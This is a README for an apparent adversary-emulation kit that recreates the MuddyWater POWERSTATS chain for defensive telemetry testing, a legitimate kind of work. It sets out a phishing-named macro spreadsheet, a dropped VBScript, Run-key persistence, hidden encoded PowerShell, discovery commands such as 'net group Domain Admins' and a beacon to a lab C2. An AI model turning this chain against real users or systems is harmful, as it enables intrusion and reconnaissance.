# MuddyCalc — MuddyWater POWERSTATS TTP Emulation

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This code replicates documented malware behavior for defensive security
testing and endpoint telemetry validation. It does NOT contain real malware
payloads, exploits, or evasion techniques.

LEGAL: Only run this in environments you own or have explicit written
authorization to test. Unauthorized use may violate computer fraud laws.

Final payload: calc.exe (safe, benign)
C2: Local network only (hardcoded private IP: 192.168.0.148)
============================================================================
```

## Overview

MuddyCalc is a safe reconstruction of the **MuddyWater** (APT: MERCURY / Mango Sandstorm / Seedworm / TEMP.Zagros) attack chain documented in [CISA Advisory AA22-055A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-055a) and multiple vendor threat reports.

MuddyWater operates under Iran's Ministry of Intelligence and Security (MOIS) and targets critical infrastructure — energy, water, defense, local government, oil and gas — across the Middle East, North America, and Europe.

**What this emulates:**
- Macro-enabled spreadsheet delivery (spearphishing attachment)
- VBScript payload dropped to `%TEMP%` by macro
- Registry Run key persistence
- PowerShell-based POWERSTATS backdoor with system discovery
- C2 beacon to local HTTP server

**Safety mechanisms:**
- Final payload is `calc.exe` (hardcoded, not configurable)
- Registry persistence value is `calc.exe` (safe even on reboot)
- C2 server is `192.168.0.148:8888` (private IP, hardcoded)
- No obfuscation — all code is readable with extensive comments

## Attack Chain Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           MuddyCalc Attack Chain                            │
│                   (MuddyWater POWERSTATS TTP Emulation)                     │
└─────────────────────────────────────────────────────────────────────────────┘

  [User]                    [Windows Target]                    [MacBook C2]
    │                             │                             192.168.0.148
    │                             │                                  │
    │  1. Open spreadsheet        │                                  │
    │     & enable macros         │                                  │
    │ ─────────────────────────►  │                                  │
    │                             │                                  │
    │                     ┌───────┴───────┐                          │
    │                     │  Macro fires  │                          │
    │                     │  (T1204.002)  │                          │
    │                     └───────┬───────┘                          │
    │                             │                                  │
    │                     ┌───────┴───────────────────┐              │
    │                     │  Drop VBScript to %TEMP%  │              │
    │                     │  (T1059.005)              │              │
    │                     └───────┬───────────────────┘              │
    │                             │                                  │
    │                     ┌───────┴───────────────────┐              │
    │                     │  wscript.exe executes     │              │
    │                     │  update_check.vbs         │              │
    │                     └───────┬───────────────────┘              │
    │                             │                                  │
    │                     ┌───────┴───────────────────┐              │
    │                     │  Registry Run key written │              │
    │                     │  (T1547.001) = "calc.exe" │              │
    │                     └───────┬───────────────────┘              │
    │                             │                                  │
    │                     ┌───────┴───────────────────┐              │
    │                     │  PowerShell launched       │              │
    │                     │  POWERSTATS emulation     │              │
    │                     │  (T1059.001)              │              │
    │                     └───────┬───────────────────┘              │
    │                             │                                  │
    │                     ┌───────┴───────────────────┐              │
    │                     │  Discovery burst:         │              │
    │                     │  whoami      (T1033)      │              │
    │                     │  systeminfo  (T1082)      │              │
    │                     │  ipconfig    (T1016)      │              │
    │                     │  tasklist    (T1057)      │              │
    │                     │  net group   (T1069.002)  │              │
    │                     │  dir docs    (T1083)      │              │
    │                     └───────┬───────────────────┘              │
    │                             │                                  │
    │                             │  HTTP POST /beacon               │
    │                             │ ──────────────────────────────►  │
    │                             │                                  │
    │                             │  {"status":"ok","command":"calc"} │
    │                             │ ◄──────────────────────────────  │
    │                             │                                  │
    │                     ┌───────┴───────────────────┐              │
    │                     │  calc.exe launched         │              │
    │                     │  (SAFE payload)           │              │
    │                     └───────────────────────────┘              │
```

### Expected Process Tree

```
soffice.exe                                                    ← LibreOffice Calc
  └── soffice.bin                                              ← Macro execution context
        └── wscript.exe %TEMP%\update_check.vbs                ← Stage 2: dropped VBScript
              └── powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand <base64>
                    ├── cmd.exe /c whoami                       ← T1033
                    ├── cmd.exe /c systeminfo                   ← T1082
                    ├── cmd.exe /c ipconfig /all                ← T1016
                    ├── cmd.exe /c tasklist                     ← T1057
                    ├── cmd.exe /c net group "Domain Admins" /domain  ← T1069.002
                    ├── cmd.exe /c dir %USERPROFILE%\Documents  ← T1083
                    └── calc.exe                                ← SAFE payload
```

## Quick Start

### Prerequisites

- macOS development machine with Python 3.x
- `pip install openpyxl` (for spreadsheet generation)
- Windows VM with LibreOffice Calc installed (macro security set to Low)

### Build & Run

```bash
# 1. Build the spreadsheet
cd ~/Documents/Emulation/muddycalc/stage1-macro
pip install openpyxl
python3 build_spreadsheet.py
# → Q4_2025_ExpenseReport_FINAL_FINAL_v3_DO_NOT_DELETE.xlsx

# 2. Generate encoded PowerShell payload
python3 encode_payload.py
# → Prints base64 string
# → Generates final update_check.vbs (with encoded command)
# → Generates final macro.vba (with encoded command)

# 3. Open .xlsx in LibreOffice Calc (on Mac for macro embedding)
#    → Tools → Macros → Organize Dialogs → BASIC
#    → Paste contents of macro.vba (the generated version, not template)
#    → File → Save As → Microsoft Excel 2007-365 (.xlsm)
#    → Name: Q4_2025_ExpenseReport_FINAL_FINAL_v3_DO_NOT_DELETE.xlsm
#    → Copy .xlsm to muddycalc/ root directory

# 4. Start C2 server on MacBook
cd ~/Documents/Emulation/muddycalc
python3 c2-server/server.py --port 8888
# Or simple: python3 -m http.server 8888

# 5. On Windows VM — download the spreadsheet
# PowerShell:
# Invoke-WebRequest -Uri "http://192.168.0.148:8888/Q4_2025_ExpenseReport_FINAL_FINAL_v3_DO_NOT_DELETE.xlsm" -OutFile "$HOME\Downloads\Q4_2025_ExpenseReport_FINAL_FINAL_v3_DO_NOT_DELETE.xlsm"

# 6. On Windows VM — open the spreadsheet
# Double-click → LibreOffice Calc → macro fires → full chain executes
# Watch C2 server console for beacon
# Check Esinta UI for process tree
```

## MITRE ATT&CK Mapping

| Stage | Technique | ID | Implementation |
|-------|-----------|-----|---------------|
| Delivery | Phishing: Spearphishing Attachment | T1566.001 | Macro-enabled .xlsm delivered to target |
| Execution | User Execution: Malicious File | T1204.002 | User opens spreadsheet, enables macros |
| Execution | Command & Scripting: VBScript | T1059.005 | Macro drops + executes VBScript |
| Execution | Command & Scripting: PowerShell | T1059.001 | POWERSTATS backdoor emulation |
| Persistence | Boot/Logon Autostart: Registry Run Keys | T1547.001 | HKCU\...\Run\UpdateCheck = "calc.exe" |
| Defense Evasion | Time-Based Evasion | T1497.003 | Start-Sleep before discovery |
| Discovery | System Owner/User Discovery | T1033 | whoami |
| Discovery | System Information Discovery | T1082 | systeminfo |
| Discovery | System Network Config Discovery | T1016 | ipconfig /all |
| Discovery | Process Discovery | T1057 | tasklist |
| Discovery | Permission Groups Discovery: Domain | T1069.002 | net group "Domain Admins" /domain |
| Discovery | File and Directory Discovery | T1083 | dir %USERPROFILE%\Documents |
| C2 | Application Layer Protocol: Web | T1071.001 | HTTP POST beacon to local C2 |

## What We Don't Implement

| MuddyWater Behavior | Why Not Implemented |
|---------------------|---------------------|
| Base52/base64 obfuscation layers | Evasion — not needed for detection testing |
| Encrypted C2 communications | Obfuscation — we use plaintext HTTP |
| Cloud storage C2 (OneDrive API) | Complexity — local HTTP is sufficient |
| WMI sandbox detection queries | Evasion — we simplify to Start-Sleep |
| Credential theft (Mimikatz, LaZagne) | Actual offensive capability |
| Lateral movement (PsExec, WMI) | Could cause real damage in a network |
| Persistent C2 loop with backoff | Would require manual cleanup |
| Multiple payload stages (.dll + .reg) | Complexity — single .vbs achieves same telemetry |
| Email delivery infrastructure | Operational security concern |

## Safety Mechanisms

### 1. Hardcoded Safe Payload
The final payload is ALWAYS `calc.exe`. Hardcoded in `powerstats.ps1`. Not configurable via arguments, environment variables, or C2 responses.

### 2. Local-Only C2
C2 server runs at `192.168.0.148:8888`. The PowerShell beacon target is a hardcoded **private RFC1918 IP address**. No command-line override.

### 3. Safe Persistence
The Registry Run key persistence writes `calc.exe` as the value — NOT the PowerShell backdoor. If the scheduled persistence fires on reboot, it only opens Calculator.

### 4. No Evasion, No Obfuscation
VBA macro is fully commented. VBScript is fully commented. PowerShell is NOT obfuscated. Real POWERSTATS uses multiple layers of base64 + string replacement. We skip all of it.

## Cleanup

After testing, remove artifacts from the Windows VM:

```powershell
# Remove Registry Run key
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCheck" -ErrorAction SilentlyContinue

# Remove dropped VBScript
Remove-Item "$env:TEMP\update_check.vbs" -ErrorAction SilentlyContinue

# Remove downloaded spreadsheet
Remove-Item "$HOME\Downloads\Q4_2025_ExpenseReport_FINAL_FINAL_v3_DO_NOT_DELETE.xlsm" -ErrorAction SilentlyContinue
```

To remove firewall rules:
```powershell
Get-NetFirewallRule -DisplayName "Esinta Lab*" | Remove-NetFirewallRule
```

## Attribution

- **CISA Advisory AA22-055A** — Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government and Commercial Networks
- **MITRE G0069** — MuddyWater group profile
- **MITRE S0223** — POWERSTATS malware profile
- **Unit 42** — "Muddying the Water: Targeted Attacks in the Middle East" (November 2017)
- **Trend Micro** — "MuddyWater Campaign Uses Decoy Documents to Deliver POWERSTATS Backdoor"
- **Symantec** — "Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms"
- **ClearSky** — "MuddyWater Operations in Lebanon and Oman"

## Directory Structure

```
muddycalc/
├── README.md                           # This file
├── ATTRIBUTION.md                      # Maps each component to public sources
├── c2-server/
│   ├── server.py                       # Custom HTTP server with beacon logging
│   └── README.md                       # C2 setup instructions
├── stage1-macro/
│   ├── macro.vba                       # VBA macro source (template)
│   ├── build_spreadsheet.py            # Generates .xlsx with expense data
│   ├── encode_payload.py               # Base64-encodes PowerShell + generates final files
│   ├── expense_data.json               # Expense report data
│   └── README.md                       # Build instructions
├── stage2-persistence/
│   ├── update_check.vbs                # VBScript dropped by macro (template)
│   └── README.md                       # VBScript behavior + MITRE mapping
├── stage3-powerstats/
│   ├── powerstats.ps1                  # PowerShell backdoor emulation
│   └── README.md                       # POWERSTATS behavior + MITRE mapping
├── docs/
│   ├── attack-chain.md                 # Full attack chain walkthrough
│   ├── mitre-mapping.md                # Complete MITRE ATT&CK mapping
│   └── telemetry-expected.md           # Expected endpoint telemetry
└── lab-setup/
    ├── setup-libreoffice.md            # LibreOffice installation guide
    └── firewall-prep.ps1               # VM firewall configuration
```
